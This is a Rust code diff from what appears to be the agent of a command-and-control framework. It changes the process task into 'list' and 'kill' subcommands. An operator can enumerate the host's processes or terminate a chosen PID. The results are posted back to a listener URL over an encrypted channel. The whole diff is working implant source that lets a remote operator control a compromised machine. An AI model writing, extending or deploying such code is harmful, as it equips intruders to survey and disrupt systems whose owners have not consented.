@@ -346,32 +346,67 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 let mut sys = sysinfo::System::new_all();
                 sys.refresh_all();
 
-                let args = task_args[1..].join(" ");
-                let fx: Vec<&str> = args.split(":").collect();
-                let filter = fx[0];
-                let exclude = fx[1];
+                let subcommand = task_args[1].to_string();
 
-                let mut output = String::new();
-                output = output + "\n";
-                for (pid, process) in sys.processes() {
-                    if  (filter == "*" && exclude == "") ||
-                        (filter == "*" && !process.name().contains(exclude.clone())) ||
-                        (process.name().contains(filter.clone()) && exclude == "") ||
-                        (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
-                    {
-                        output = output + format!("{pid}\t{}\n", process.name()).as_str();
+                match subcommand.as_str() {
+                    "kill" => {
+                        let pid: u32 = task_args[2].parse().unwrap();
+
+                        if let Some(process) = sys.process(sysinfo::Pid::from_u32(pid)) {
+                            process.kill();
+
+                            post_task_result(
+                                "The process killed successfully.".to_string().as_bytes(),
+                                agent_name.to_string(),
+                                listener_url.to_string(),
+                                headers.clone(),
+                                config.my_secret_key.clone(),
+                                config.server_public_key.clone(),
+                                &client,
+                            ).await;
+                        }
+                    }
+                    "list" => {
+                        let args = task_args[2..].join(" ");
+                        let fx: Vec<&str> = args.split(":").collect();
+                        let filter = fx[0];
+                        let exclude = fx[1];
+        
+                        let mut output = String::new();
+                        output = output + "\n";
+                        for (pid, process) in sys.processes() {
+                            if  (filter == "*" && exclude == "") ||
+                                (filter == "*" && !process.name().contains(exclude.clone())) ||
+                                (process.name().contains(filter.clone()) && exclude == "") ||
+                                (process.name().contains(filter.clone()) && !process.name().contains(exclude.clone()))
+                            {
+                                output = output + format!("{pid}\t{}\n", process.name()).as_str();
+                            }
+                        }
+        
+                        post_task_result(
+                            output.as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    _ => {
+                        post_task_result(
+                            "Subcommand not specified.".to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
                     }
                 }
 
-                post_task_result(
-                    output.as_bytes(),
-                    agent_name.to_string(),
-                    listener_url.to_string(),
-                    headers.clone(),
-                    config.my_secret_key.clone(),
-                    config.server_public_key.clone(),
-                    &client,
-                ).await;
             }
             "pwd" => {
                 match std::env::current_dir() {
